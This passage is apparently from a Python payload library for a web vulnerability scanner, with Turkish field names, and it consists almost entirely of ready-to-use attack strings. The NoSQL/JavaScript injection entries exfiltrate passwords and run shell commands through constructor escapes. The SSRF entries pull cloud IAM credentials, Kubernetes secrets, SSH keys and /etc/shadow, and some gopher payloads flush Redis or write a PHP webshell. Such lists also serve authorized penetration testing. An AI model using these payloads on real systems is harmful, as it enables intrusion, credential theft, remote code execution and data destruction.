    {"payload": "{\"$where\": \"sleep(5000)\"}", "guven": 0.9, "aciklama": "Basic time delay"},
    {"payload": "'; if(this.username=='admin') sleep(5000); return true; var x='", "guven": 0.95, "aciklama": "Conditional time delay"},
    {"payload": "{\"$where\": \"this.password.charAt(0)=='a' && sleep(3000)\"}", "guven": 0.9, "aciklama": "Character-based time injection"},
    {"payload": "'; var start=Date.now(); while(Date.now()-start<5000); return true; var x='", "guven": 0.9, "aciklama": "JavaScript-based delay"},
    {"payload": "{\"$where\": \"this.role=='admin' ? sleep(5000) : true\"}", "guven": 0.9, "aciklama": "Ternary time delay"},
    {"payload": "'; for(var i=0;i<1000000;i++) Math.random(); return true; var x='", "guven": 0.85, "aciklama": "CPU-intensive delay"},
    {"payload": "{\"$where\": \"Object.keys(this).length > 5 && sleep(3000)\"}", "guven": 0.88, "aciklama": "Property count time delay"},
    {"payload": "'; if(JSON.stringify(this).length > 100) sleep(4000); return true; var x='", "guven": 0.88, "aciklama": "JSON length time delay"},
    {"payload": "{\"$where\": \"this.toString().includes('admin') && sleep(2000)\"}", "guven": 0.9, "aciklama": "String search time delay"},
    {"payload": "'; var delay = this.username.length * 1000; sleep(delay); return true; var x='", "guven": 0.9, "aciklama": "Dynamic time delay"},
    
    # Error-based Information Disclosure (401-450)
    {"payload": "'; throw new Error(JSON.stringify(this)); var x='", "guven": 0.9, "aciklama": "Error-based data extraction"},
    {"payload": "{\"$where\": \"throw new Error(this.password)\"}", "guven": 0.95, "aciklama": "Password disclosure via error"},
    {"payload": "'; db.test.insert({data: Object.keys(this)}); var x='", "guven": 0.9, "aciklama": "Data insertion for extraction"},
    {"payload": "'; return undefined.nonexistent.property; var x='", "guven": 0.8, "aciklama": "Null reference error"},
    {"payload": "{\"$where\": \"this.admin.permissions.length\"}", "guven": 0.85, "aciklama": "Property access error"},
    {"payload": "'; eval('throw new Error(this.username)'); var x='", "guven": 0.9, "aciklama": "Eval-based error disclosure"},
    {"payload": "{\"$where\": \"parseInt(this.password)\"}", "guven": 0.8, "aciklama": "Type conversion error"},
    {"payload": "'; console.log(this); throw 'debug'; var x='", "guven": 0.85, "aciklama": "Console logging attempt"},
    {"payload": "{\"$where\": \"require('fs').readFileSync('/etc/passwd')\"}", "guven": 0.95, "aciklama": "File read error disclosure"},
    {"payload": "'; JSON.parse(this.invalidJson); var x='", "guven": 0.8, "aciklama": "JSON parsing error"},
    
    # Advanced Bypass Techniques (451-500)
    {"payload": "'; return (function(){return this.constructor.constructor('return process')();})().env; var x='", "guven": 0.95, "aciklama": "Advanced constructor bypass"},
    {"payload": "{\"$where\": \"({}+{}).constructor.constructor('return process')().exit()\"}", "guven": 0.95, "aciklama": "Object coercion bypass"},
    {"payload": "'; var f=this.constructor.constructor; return f('return this')().global.process; var x='", "guven": 0.95, "aciklama": "Multi-step constructor bypass"},
    {"payload": "{\"$where\": \"[].constructor.constructor('return process')().mainModule.require('child_process').exec('whoami')\"}", "guven": 0.98, "aciklama": "Command execution attempt"},
    {"payload": "'; return require.cache[Object.keys(require.cache)[0]].exports; var x='", "guven": 0.9, "aciklama": "Require cache exploitation"},
    {"payload": "{\"$where\": \"global.process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:'pipe'}).output\"}", "guven": 0.98, "aciklama": "Direct process binding"},
    {"payload": "'; var vm=this.constructor.constructor('return process')().mainModule.require('vm'); return vm.runInThisContext('process.env'); var x='", "guven": 0.95, "aciklama": "VM context manipulation"},
    {"payload": "{\"$where\": \"Buffer.from('test').constructor.constructor('return process')().exit\"}", "guven": 0.95, "aciklama": "Buffer constructor bypass"},
    {"payload": "'; return RegExp.prototype.constructor.constructor('return process')().platform; var x='", "guven": 0.9, "aciklama": "RegExp constructor bypass"},
    {"payload": "{\"$where\": \"({}).toString.constructor.constructor('return process')().versions\"}", "guven": 0.9, "aciklama": "toString constructor bypass"},
    
    # Special Characters and Encoding (Bonus patterns)
    {"payload": "{\"username\": {\"$regex\": \"\\u0061\\u0064\\u006D\\u0069\\u006E\"}}", "guven": 0.85, "aciklama": "Unicode encoded admin"},
    {"payload": "\\u0027; return true; var x=\\u0027", "guven": 0.8, "aciklama": "Unicode quote bypass"},
    {"payload": "{\"password\": {\"$regex\": \"\\\\x61\\\\x64\\\\x6D\\\\x69\\\\x6E\"}}", "guven": 0.8, "aciklama": "Hex encoded pattern"},
    {"payload": "\\x27; return this.constructor.name; var x=\\x27", "guven": 0.85, "aciklama": "Hex quote bypass"},
    {"payload": "{\"$where\": \"String.fromCharCode(97,100,109,105,110) == 'admin'\"}", "guven": 0.88, "aciklama": "Character code bypass"},
    {"payload": "'; return btoa(JSON.stringify(this)); var x='", "guven": 0.85, "aciklama": "Base64 encoding extraction"},
    {"payload": "{\"username\": {\"$regex\": \"(?i)ADMIN\"}}", "guven": 0.8, "aciklama": "Inline case-insensitive flag"},
    {"payload": "/**/'; return true; var x='/**/", "guven": 0.8, "aciklama": "Comment-based bypass"},
    {"payload": "{\"$where\": \"'admin'.split('').reverse().join('') == 'nimda'\"}", "guven": 0.8, "aciklama": "String manipulation bypass"},
    {"payload": "'; return [].slice.call(arguments); var x='", "guven": 0.8, "aciklama": "Arguments object access"}
],
            
            ZafiyetTipi.SSRF: [
                # Temel SSRF Payloadları
    {"payload": "http://localhost:22", "guven": 0.85, "aciklama": "Localhost port tarama"},
    {"payload": "http://127.0.0.1:80", "guven": 0.85, "aciklama": "Loopback erişimi"},
    {"payload": "http://metadata.google.internal/", "guven": 0.9, "aciklama": "Cloud metadata erişimi"},
    {"payload": "file:///etc/passwd", "guven": 0.9, "aciklama": "Dosya protokolü SSRF"},
    {"payload": "gopher://127.0.0.1:3306/_", "guven": 0.85, "aciklama": "Gopher protokolü"},
    {"payload": "http://169.254.169.254/", "guven": 0.9, "aciklama": "AWS metadata servisi"},
    {"payload": "http://169.254.169.254/latest/meta-data/", "guven": 0.9, "aciklama": "AWS metadata latest"},
    {"payload": "http://localhost:3306", "guven": 0.8, "aciklama": "MySQL port SSRF"},
    {"payload": "http://localhost:6379", "guven": 0.8, "aciklama": "Redis port SSRF"},
    {"payload": "http://localhost:27017", "guven": 0.8, "aciklama": "MongoDB port SSRF"},
    {"payload": "dict://localhost:11211/", "guven": 0.8, "aciklama": "Dict protokolü Memcached"},
    {"payload": "ldap://localhost:389/", "guven": 0.8, "aciklama": "LDAP protokolü SSRF"},
    {"payload": "sftp://localhost:22/", "guven": 0.75, "aciklama": "SFTP protokolü SSRF"},
    
    # AWS Metadata Exploitation
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "guven": 0.95, "aciklama": "AWS IAM credentials"},
    {"payload": "http://169.254.169.254/latest/user-data", "guven": 0.9, "aciklama": "AWS user data"},
    {"payload": "http://169.254.169.254/latest/meta-data/public-keys/", "guven": 0.9, "aciklama": "AWS public keys"},
    {"payload": "http://169.254.169.254/latest/meta-data/hostname", "guven": 0.85, "aciklama": "AWS hostname"},
    {"payload": "http://169.254.169.254/latest/meta-data/local-ipv4", "guven": 0.85, "aciklama": "AWS local IP"},
    {"payload": "http://169.254.169.254/latest/meta-data/public-ipv4", "guven": 0.85, "aciklama": "AWS public IP"},
    {"payload": "http://169.254.169.254/latest/meta-data/security-groups", "guven": 0.9, "aciklama": "AWS security groups"},
    {"payload": "http://169.254.169.254/latest/meta-data/placement/availability-zone", "guven": 0.8, "aciklama": "AWS availability zone"},
    {"payload": "http://169.254.169.254/latest/meta-data/instance-id", "guven": 0.85, "aciklama": "AWS instance ID"},
    {"payload": "http://169.254.169.254/latest/meta-data/instance-type", "guven": 0.8, "aciklama": "AWS instance type"},
    {"payload": "http://169.254.169.254/latest/meta-data/ami-id", "guven": 0.8, "aciklama": "AWS AMI ID"},
    {"payload": "http://169.254.169.254/latest/meta-data/reservation-id", "guven": 0.8, "aciklama": "AWS reservation ID"},
    
    # Google Cloud Metadata
    {"payload": "http://metadata.google.internal/computeMetadata/v1/", "guven": 0.9, "aciklama": "GCP metadata v1"},
    {"payload": "http://169.254.169.254/computeMetadata/v1/", "guven": 0.9, "aciklama": "GCP metadata direct"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/", "guven": 0.9, "aciklama": "GCP instance metadata"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/project/", "guven": 0.9, "aciklama": "GCP project metadata"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "guven": 0.95, "aciklama": "GCP service accounts"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/", "guven": 0.9, "aciklama": "GCP instance attributes"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/hostname", "guven": 0.85, "aciklama": "GCP hostname"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/zone", "guven": 0.85, "aciklama": "GCP zone"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/id", "guven": 0.85, "aciklama": "GCP instance ID"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/instance/machine-type", "guven": 0.8, "aciklama": "GCP machine type"},
    
    # Azure Metadata
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "guven": 0.9, "aciklama": "Azure instance metadata"},
    {"payload": "http://169.254.169.254/metadata/identity/oauth2/token", "guven": 0.95, "aciklama": "Azure OAuth token"},
    {"payload": "http://169.254.169.254/metadata/instance/compute", "guven": 0.9, "aciklama": "Azure compute metadata"},
    {"payload": "http://169.254.169.254/metadata/instance/network", "guven": 0.9, "aciklama": "Azure network metadata"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/vmId", "guven": 0.85, "aciklama": "Azure VM ID"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/location", "guven": 0.8, "aciklama": "Azure location"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/resourceGroupName", "guven": 0.85, "aciklama": "Azure resource group"},
    {"payload": "http://169.254.169.254/metadata/instance/compute/subscriptionId", "guven": 0.9, "aciklama": "Azure subscription ID"},
    
    # Localhost Port Scanning
    {"payload": "http://localhost:21", "guven": 0.8, "aciklama": "FTP port scan"},
    {"payload": "http://localhost:23", "guven": 0.8, "aciklama": "Telnet port scan"},
    {"payload": "http://localhost:25", "guven": 0.8, "aciklama": "SMTP port scan"},
    {"payload": "http://localhost:53", "guven": 0.8, "aciklama": "DNS port scan"},
    {"payload": "http://localhost:110", "guven": 0.8, "aciklama": "POP3 port scan"},
    {"payload": "http://localhost:143", "guven": 0.8, "aciklama": "IMAP port scan"},
    {"payload": "http://localhost:443", "guven": 0.8, "aciklama": "HTTPS port scan"},
    {"payload": "http://localhost:993", "guven": 0.8, "aciklama": "IMAPS port scan"},
    {"payload": "http://localhost:995", "guven": 0.8, "aciklama": "POP3S port scan"},
    {"payload": "http://localhost:1433", "guven": 0.8, "aciklama": "MSSQL port scan"},
    {"payload": "http://localhost:1521", "guven": 0.8, "aciklama": "Oracle port scan"},
    {"payload": "http://localhost:5432", "guven": 0.8, "aciklama": "PostgreSQL port scan"},
    {"payload": "http://localhost:5984", "guven": 0.8, "aciklama": "CouchDB port scan"},
    {"payload": "http://localhost:9200", "guven": 0.8, "aciklama": "Elasticsearch port scan"},
    {"payload": "http://localhost:9300", "guven": 0.8, "aciklama": "Elasticsearch cluster port"},
    {"payload": "http://localhost:8080", "guven": 0.8, "aciklama": "Alternative HTTP port"},
    {"payload": "http://localhost:8443", "guven": 0.8, "aciklama": "Alternative HTTPS port"},
    {"payload": "http://localhost:8888", "guven": 0.8, "aciklama": "Common web port"},
    {"payload": "http://localhost:3000", "guven": 0.8, "aciklama": "Development server port"},
    {"payload": "http://localhost:4000", "guven": 0.8, "aciklama": "Development server port"},
    {"payload": "http://localhost:5000", "guven": 0.8, "aciklama": "Development server port"},
    {"payload": "http://localhost:8000", "guven": 0.8, "aciklama": "Development server port"},
    
    # Internal Network Scanning
    {"payload": "http://127.0.0.1:8080", "guven": 0.8, "aciklama": "Loopback web server"},
    {"payload": "http://127.0.0.1:3306", "guven": 0.8, "aciklama": "Loopback MySQL"},
    {"payload": "http://127.0.0.1:6379", "guven": 0.8, "aciklama": "Loopback Redis"},
    {"payload": "http://127.0.0.1:27017", "guven": 0.8, "aciklama": "Loopback MongoDB"},
    {"payload": "http://127.0.0.1:5432", "guven": 0.8, "aciklama": "Loopback PostgreSQL"},
    {"payload": "http://127.0.0.1:9200", "guven": 0.8, "aciklama": "Loopback Elasticsearch"},
    {"payload": "http://127.0.0.1:11211", "guven": 0.8, "aciklama": "Loopback Memcached"},
    {"payload": "http://127.0.0.1:389", "guven": 0.8, "aciklama": "Loopback LDAP"},
    {"payload": "http://127.0.0.1:636", "guven": 0.8, "aciklama": "Loopback LDAPS"},
    {"payload": "http://127.0.0.1:1521", "guven": 0.8, "aciklama": "Loopback Oracle"},
    {"payload": "http://127.0.0.1:1433", "guven": 0.8, "aciklama": "Loopback MSSQL"},
    {"payload": "http://127.0.0.1:5984", "guven": 0.8, "aciklama": "Loopback CouchDB"},
    
    # File Protocol Attacks
    {"payload": "file:///etc/passwd", "guven": 0.9, "aciklama": "Linux password file"},
    {"payload": "file:///etc/shadow", "guven": 0.95, "aciklama": "Linux shadow file"},
    {"payload": "file:///etc/hosts", "guven": 0.8, "aciklama": "System hosts file"},
    {"payload": "file:///etc/hostname", "guven": 0.8, "aciklama": "System hostname"},
    {"payload": "file:///etc/resolv.conf", "guven": 0.8, "aciklama": "DNS resolver config"},
    {"payload": "file:///proc/version", "guven": 0.8, "aciklama": "Kernel version info"},
    {"payload": "file:///proc/cmdline", "guven": 0.8, "aciklama": "Kernel command line"},
    {"payload": "file:///proc/meminfo", "guven": 0.8, "aciklama": "Memory information"},
    {"payload": "file:///proc/cpuinfo", "guven": 0.8, "aciklama": "CPU information"},
    {"payload": "file:///proc/self/environ", "guven": 0.85, "aciklama": "Environment variables"},
    {"payload": "file:///proc/self/cmdline", "guven": 0.85, "aciklama": "Process command line"},
    {"payload": "file:///proc/self/maps", "guven": 0.8, "aciklama": "Process memory maps"},
    {"payload": "file:///proc/net/tcp", "guven": 0.8, "aciklama": "TCP connections"},
    {"payload": "file:///proc/net/udp", "guven": 0.8, "aciklama": "UDP connections"},
    {"payload": "file:///var/log/auth.log", "guven": 0.85, "aciklama": "Authentication logs"},
    {"payload": "file:///var/log/access.log", "guven": 0.85, "aciklama": "Access logs"},
    {"payload": "file:///var/log/error.log", "guven": 0.85, "aciklama": "Error logs"},
    {"payload": "file:///var/log/apache2/access.log", "guven": 0.85, "aciklama": "Apache access logs"},
    {"payload": "file:///var/log/nginx/access.log", "guven": 0.85, "aciklama": "Nginx access logs"},
    {"payload": "file:///home/user/.ssh/id_rsa", "guven": 0.95, "aciklama": "SSH private key"},
    {"payload": "file:///home/user/.ssh/known_hosts", "guven": 0.8, "aciklama": "SSH known hosts"},
    {"payload": "file:///home/user/.bash_history", "guven": 0.85, "aciklama": "Bash history"},
    {"payload": "file:///root/.ssh/id_rsa", "guven": 0.95, "aciklama": "Root SSH key"},
    {"payload": "file:///root/.bash_history", "guven": 0.9, "aciklama": "Root bash history"},
    
    # Windows File Access
    {"payload": "file:///C:/Windows/System32/drivers/etc/hosts", "guven": 0.8, "aciklama": "Windows hosts file"},
    {"payload": "file:///C:/Windows/win.ini", "guven": 0.8, "aciklama": "Windows ini file"},
    {"payload": "file:///C:/Windows/system.ini", "guven": 0.8, "aciklama": "Windows system ini"},
    {"payload": "file:///C:/boot.ini", "guven": 0.8, "aciklama": "Windows boot ini"},
    {"payload": "file:///C:/Windows/System32/config/SAM", "guven": 0.95, "aciklama": "Windows SAM file"},
    {"payload": "file:///C:/Windows/System32/config/SYSTEM", "guven": 0.9, "aciklama": "Windows SYSTEM file"},
    {"payload": "file:///C:/Windows/System32/config/SECURITY", "guven": 0.9, "aciklama": "Windows SECURITY file"},
    
    # Gopher Protocol Exploitation
    {"payload": "gopher://127.0.0.1:3306/_%20%0D%0A%0D%0Aquit%0D%0A", "guven": 0.85, "aciklama": "Gopher MySQL attack"},
    {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "guven": 0.9, "aciklama": "Gopher Redis flushall"},
    {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0aa%0d%0a$3%0d%0a123%0d%0a", "guven": 0.85, "aciklama": "Gopher Redis set command"},
    {"payload": "gopher://127.0.0.1:11211/_%0d%0aset%20a%200%200%203%0d%0a123%0d%0a", "guven": 0.8, "aciklama": "Gopher Memcached set"},
    {"payload": "gopher://127.0.0.1:25/_EHLO%20test%0d%0a", "guven": 0.8, "aciklama": "Gopher SMTP EHLO"},
    {"payload": "gopher://127.0.0.1:389/_%0d%0a", "guven": 0.8, "aciklama": "Gopher LDAP attack"},
    {"payload": "gopher://127.0.0.1:5432/_", "guven": 0.8, "aciklama": "Gopher PostgreSQL"},
    {"payload": "gopher://127.0.0.1:1433/_", "guven": 0.8, "aciklama": "Gopher MSSQL"},
    {"payload": "gopher://127.0.0.1:1521/_", "guven": 0.8, "aciklama": "Gopher Oracle"},
    {"payload": "gopher://127.0.0.1:27017/_", "guven": 0.8, "aciklama": "Gopher MongoDB"},
    
    # Dict Protocol Attacks
    {"payload": "dict://127.0.0.1:6379/info", "guven": 0.8, "aciklama": "Dict Redis info"},
    {"payload": "dict://127.0.0.1:11211/stats", "guven": 0.8, "aciklama": "Dict Memcached stats"},
    {"payload": "dict://127.0.0.1:3306/", "guven": 0.8, "aciklama": "Dict MySQL connection"},
    {"payload": "dict://127.0.0.1:5432/", "guven": 0.8, "aciklama": "Dict PostgreSQL connection"},
    {"payload": "dict://127.0.0.1:27017/", "guven": 0.8, "aciklama": "Dict MongoDB connection"},
    {"payload": "dict://127.0.0.1:9200/", "guven": 0.8, "aciklama": "Dict Elasticsearch connection"},
    {"payload": "dict://127.0.0.1:389/", "guven": 0.8, "aciklama": "Dict LDAP connection"},
    {"payload": "dict://127.0.0.1:636/", "guven": 0.8, "aciklama": "Dict LDAPS connection"},
    {"payload": "dict://127.0.0.1:1433/", "guven": 0.8, "aciklama": "Dict MSSQL connection"},
    {"payload": "dict://127.0.0.1:1521/", "guven": 0.8, "aciklama": "Dict Oracle connection"},
    
    # LDAP Protocol Attacks
    {"payload": "ldap://127.0.0.1:389/", "guven": 0.8, "aciklama": "LDAP connection"},
    {"payload": "ldaps://127.0.0.1:636/", "guven": 0.8, "aciklama": "LDAPS connection"},
    {"payload": "ldap://localhost:389/dc=example,dc=com", "guven": 0.85, "aciklama": "LDAP domain component"},
    {"payload": "ldaps://localhost:636/cn=admin,dc=example,dc=com", "guven": 0.85, "aciklama": "LDAPS admin query"},
    {"payload": "ldap://127.0.0.1:389/cn=users,dc=local", "guven": 0.85, "aciklama": "LDAP users query"},
    {"payload": "ldap://127.0.0.1:389/ou=people", "guven": 0.8, "aciklama": "LDAP people OU"},
    {"payload": "ldap://127.0.0.1:389/cn=config", "guven": 0.85, "aciklama": "LDAP config query"},
    {"payload": "ldap://127.0.0.1:389/cn=schema", "guven": 0.8, "aciklama": "LDAP schema query"},
    
    # FTP Protocol Attacks
    {"payload": "ftp://127.0.0.1:21/", "guven": 0.8, "aciklama": "FTP connection"},
    {"payload": "ftp://anonymous@127.0.0.1:21/", "guven": 0.85, "aciklama": "FTP anonymous login"},
    {"payload": "ftp://admin:admin@127.0.0.1:21/", "guven": 0.85, "aciklama": "FTP admin login"},
    {"payload": "ftp://root:root@127.0.0.1:21/", "guven": 0.9, "aciklama": "FTP root login"},
    {"payload": "ftp://user:password@127.0.0.1:21/", "guven": 0.8, "aciklama": "FTP user login"},
    {"payload": "ftps://127.0.0.1:990/", "guven": 0.8, "aciklama": "FTPS connection"},
    {"payload": "sftp://127.0.0.1:22/", "guven": 0.8, "aciklama": "SFTP connection"},
    {"payload": "sftp://root@127.0.0.1:22/", "guven": 0.9, "aciklama": "SFTP root connection"},
    
    # Bypass Techniques - IP Encoding
    {"payload": "http://2130706433/", "guven": 0.85, "aciklama": "Decimal IP encoding"},
    {"payload": "http://0x7f000001/", "guven": 0.85, "aciklama": "Hexadecimal IP encoding"},
    {"payload": "http://017700000001/", "guven": 0.85, "aciklama": "Octal IP encoding"},
    {"payload": "http://0177.0.0.1/", "guven": 0.85, "aciklama": "Mixed octal encoding"},
    {"payload": "http://127.1/", "guven": 0.8, "aciklama": "Short IP format"},
    {"payload": "http://127.0.1/", "guven": 0.8, "aciklama": "Short IP format 2"},
    {"payload": "http://0/", "guven": 0.8, "aciklama": "Zero IP address"},
    {"payload": "http://0.0.0.0/", "guven": 0.8, "aciklama": "Zero broadcast"},
    {"payload": "http://[::]", "guven": 0.8, "aciklama": "IPv6 loopback"},
    {"payload": "http://[::1]", "guven": 0.85, "aciklama": "IPv6 localhost"},
    {"payload": "http://[::ffff:127.0.0.1]", "guven": 0.85, "aciklama": "IPv4-mapped IPv6"},
    {"payload": "http://[0:0:0:0:0:ffff:127.0.0.1]", "guven": 0.85, "aciklama": "Full IPv4-mapped IPv6"},
    
    # DNS Rebinding Attacks
    {"payload": "http://localhost.evil.com/", "guven": 0.9, "aciklama": "DNS rebinding localhost"},
    {"payload": "http://127.0.0.1.evil.com/", "guven": 0.9, "aciklama": "DNS rebinding IP"},
    {"payload": "http://evil.com@127.0.0.1/", "guven": 0.9, "aciklama": "URL userinfo bypass"},
    {"payload": "http://127.0.0.1#evil.com/", "guven": 0.85, "aciklama": "Fragment bypass"},
    {"payload": "http://127.0.0.1%23evil.com/", "guven": 0.85, "aciklama": "Encoded fragment bypass"},
    {"payload": "http://127.0.0.1%2523evil.com/", "guven": 0.85, "aciklama": "Double encoded bypass"},
    {"payload": "http://127.0.0.1%252523evil.com/", "guven": 0.85, "aciklama": "Triple encoded bypass"},
    
    # URL Encoding Bypasses
    {"payload": "http://127.0.0.1%2f", "guven": 0.8, "aciklama": "URL encoded slash"},
    {"payload": "http://127.0.0.1%2F", "guven": 0.8, "aciklama": "URL encoded slash uppercase"},
    {"payload": "http://127.0.0.1%252f", "guven": 0.8, "aciklama": "Double URL encoded slash"},
    {"payload": "http://127.0.0.1%5c", "guven": 0.8, "aciklama": "URL encoded backslash"},
    {"payload": "http://127.0.0.1%3a8080", "guven": 0.8, "aciklama": "URL encoded colon"},
    {"payload": "http://127.0.0.1%253a8080", "guven": 0.8, "aciklama": "Double encoded colon"},
    {"payload": "http://127.0.0.1%2e%2e%2f", "guven": 0.8, "aciklama": "URL encoded dot dot slash"},
    {"payload": "http://127.0.0.1%2f%2e%2e%2f", "guven": 0.8, "aciklama": "URL encoded path traversal"},
    
    # Unicode Bypasses
    {"payload": "http://127.0.0.1％2f", "guven": 0.8, "aciklama": "Unicode percent bypass"},
    {"payload": "http://127.0.0.1＇", "guven": 0.8, "aciklama": "Unicode quote bypass"},
    {"payload": "http://127.0.0.1＠evil.com", "guven": 0.85, "aciklama": "Unicode at bypass"},
    {"payload": "http://127.0.0.1：8080", "guven": 0.8, "aciklama": "Unicode colon bypass"},
    {"payload": "http://127.0.0.1／", "guven": 0.8, "aciklama": "Unicode slash bypass"},
    {"payload": "http://127.0.0.1＼", "guven": 0.8, "aciklama": "Unicode backslash bypass"},
    {"payload": "http://１２７.０.０.１", "guven": 0.85, "aciklama": "Unicode digit bypass"},
    
    # CRLF Injection in SSRF
    {"payload": "http://127.0.0.1:80/test%0d%0aHost: evil.com", "guven": 0.9, "aciklama": "CRLF Host header injection"},
    {"payload": "http://127.0.0.1:80/test%0d%0aX-Forwarded-For: 192.168.1.1", "guven": 0.85, "aciklama": "CRLF XFF injection"},
    {"payload": "http://127.0.0.1:80/test%0d%0aUser-Agent: SSRF", "guven": 0.8, "aciklama": "CRLF User-Agent injection"},
    {"payload": "http://127.0.0.1:80/test%0d%0aAuthorization: Bearer token", "guven": 0.9, "aciklama": "CRLF Auth header injection"},
    {"payload": "http://127.0.0.1:80/test%0a%0dHost: evil.com", "guven": 0.85, "aciklama": "Reversed CRLF injection"},
    {"payload": "http://127.0.0.1:80/test%0d%0aContent-Length: 0%0d%0a%0d%0a", "guven": 0.85, "aciklama": "CRLF Content-Length bypass"},
    
    # Protocol Smuggling
    {"payload": "http://127.0.0.1:80/test%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost: 127.0.0.1", "guven": 0.95, "aciklama": "HTTP request smuggling"},
    {"payload": "http://127.0.0.1:80/test%0d%0a%0d%0aPOST /api HTTP/1.1%0d%0aHost: localhost", "guven": 0.9, "aciklama": "HTTP POST smuggling"},
    {"payload": "http://127.0.0.1:80/test%0d%0a%0d%0aDELETE /file HTTP/1.1", "guven": 0.9, "aciklama": "HTTP DELETE smuggling"},
    {"payload": "http://127.0.0.1:80/test%0d%0a%0d%0aPUT /upload HTTP/1.1", "guven": 0.9, "aciklama": "HTTP PUT smuggling"},
    
    # Container/Docker Metadata
    {"payload": "http://127.0.0.1:2375/containers/json", "guven": 0.95, "aciklama": "Docker API containers"},
    {"payload": "http://127.0.0.1:2376/containers/json", "guven": 0.95, "aciklama": "Docker API TLS containers"},
    {"payload": "http://127.0.0.1:2375/images/json", "guven": 0.9, "aciklama": "Docker API images"},
    {"payload": "http://127.0.0.1:2375/version", "guven": 0.85, "aciklama": "Docker API version"},
    {"payload": "http://127.0.0.1:2375/info", "guven": 0.9, "aciklama": "Docker API info"},
    {"payload": "http://127.0.0.1:2375/events", "guven": 0.85, "aciklama": "Docker API events"},
    {"payload": "http://127.0.0.1:2375/containers/create", "guven": 0.95, "aciklama": "Docker container creation"},
    {"payload": "http://unix:/var/run/docker.sock/containers/json", "guven": 0.95, "aciklama": "Docker socket containers"},
    {"payload": "http://unix:/var/run/docker.sock/images/json", "guven": 0.9, "aciklama": "Docker socket images"},
    
    # Kubernetes API
    {"payload": "http://127.0.0.1:8080/api/v1/namespaces", "guven": 0.9, "aciklama": "Kubernetes namespaces"},
    {"payload": "http://127.0.0.1:8080/api/v1/pods", "guven": 0.9, "aciklama": "Kubernetes pods"},
    {"payload": "http://127.0.0.1:8080/api/v1/services", "guven": 0.85, "aciklama": "Kubernetes services"},
    {"payload": "http://127.0.0.1:8080/api/v1/secrets", "guven": 0.95, "aciklama": "Kubernetes secrets"},
    {"payload": "http://127.0.0.1:8080/api/v1/configmaps", "guven": 0.9, "aciklama": "Kubernetes configmaps"},
    {"payload": "http://127.0.0.1:6443/api/v1/namespaces", "guven": 0.9, "aciklama": "Kubernetes secure API namespaces"},
    {"payload": "http://127.0.0.1:10250/pods", "guven": 0.9, "aciklama": "Kubelet API pods"},
    {"payload": "http://127.0.0.1:10255/pods", "guven": 0.85, "aciklama": "Kubelet readonly API"},
    {"payload": "http://127.0.0.1:10250/stats/summary", "guven": 0.85, "aciklama": "Kubelet stats"},
    {"payload": "http://127.0.0.1:10250/metrics", "guven": 0.8, "aciklama": "Kubelet metrics"},
    
    # Consul API
    {"payload": "http://127.0.0.1:8500/v1/agent/self", "guven": 0.9, "aciklama": "Consul agent info"},
    {"payload": "http://127.0.0.1:8500/v1/catalog/services", "guven": 0.9, "aciklama": "Consul services"},
    {"payload": "http://127.0.0.1:8500/v1/catalog/nodes", "guven": 0.85, "aciklama": "Consul nodes"},
    {"payload": "http://127.0.0.1:8500/v1/kv/", "guven": 0.95, "aciklama": "Consul key-value store"},
    {"payload": "http://127.0.0.1:8500/v1/agent/members", "guven": 0.85, "aciklama": "Consul cluster members"},
    {"payload": "http://127.0.0.1:8500/v1/status/leader", "guven": 0.8, "aciklama": "Consul leader"},
    {"payload": "http://127.0.0.1:8500/v1/acl/tokens", "guven": 0.95, "aciklama": "Consul ACL tokens"},
    
    # Etcd API
    {"payload": "http://127.0.0.1:2379/v2/keys/", "guven": 0.9, "aciklama": "Etcd v2 keys"},
    {"payload": "http://127.0.0.1:2379/v2/stats/leader", "guven": 0.85, "aciklama": "Etcd leader stats"},
    {"payload": "http://127.0.0.1:2379/v2/stats/self", "guven": 0.85, "aciklama": "Etcd self stats"},
    {"payload": "http://127.0.0.1:2379/v2/stats/store", "guven": 0.85, "aciklama": "Etcd store stats"},
    {"payload": "http://127.0.0.1:2379/version", "guven": 0.8, "aciklama": "Etcd version"},
    {"payload": "http://127.0.0.1:2379/health", "guven": 0.8, "aciklama": "Etcd health"},
    {"payload": "http://127.0.0.1:2380/v2/keys/", "guven": 0.9, "aciklama": "Etcd peer keys"},
    
    # Redis Exploitation via HTTP
    {"payload": "http://127.0.0.1:6379/", "guven": 0.8, "aciklama": "Redis HTTP connection"},
    {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a", "guven": 0.85, "aciklama": "Gopher Redis info command"},
    {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aconfig%0d%0a*1%0d%0a$3%0d%0aget%0d%0a*1%0d%0a$4%0d%0adir%0d%0a", "guven": 0.9, "aciklama": "Gopher Redis config get"},
    {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a", "guven": 0.95, "aciklama": "Gopher Redis config set dir"},
    {"payload": "gopher://127.0.0.1:6379/_*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a", "guven": 0.95, "aciklama": "Gopher Redis webshell upload"},
